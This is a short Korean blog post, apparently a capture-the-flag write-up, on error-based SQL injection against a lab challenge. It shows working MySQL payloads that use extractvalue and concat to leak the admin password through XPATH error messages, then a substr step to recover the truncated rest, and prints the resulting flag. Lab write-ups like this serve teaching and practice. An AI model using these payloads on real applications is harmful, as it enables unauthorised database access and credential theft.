```markdown
---
layout: post
title: "error based sql injection"
categories: [Web Hacking]
tags: [SQL Injection, Error Based, Security]
last_modified_at: 2023-12-28
---

' union select * from user이라고 가볍게 적어봄 

![스크린샷 2023-12-27 오후 9.26.28](https://blog.kakaocdn.net/dna/DFmFm/btsCODshT6E/AAAAAAAAAAAAAAAAAAAAAHgU8vWmDDjx8kdYS0n4ruWP2RhZ-es-1D7LQc072asC/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=v%2Bi5xIJa%2FdT8OtfUj3hzrGBudYo%3D)

에러 뜸  
아 맞다 error based 랬지  

' union select extractvalue(1,concat(0x3a, (select upw from user where uid='admin'))); -- -  
(1105, "XPATH syntax error: ':DH{c3968c78840750168774ad951...'")  

' union select extractvalue(1,concat(0x3a,(select substr(upw,20,50) from user where uid = 'admin'))); -- -  
(1105, "XPATH syntax error: ':8774ad951fc98bf788563c4d}'")  

DH{c3968c78840750168774ad951fc98bf788563c4d}
```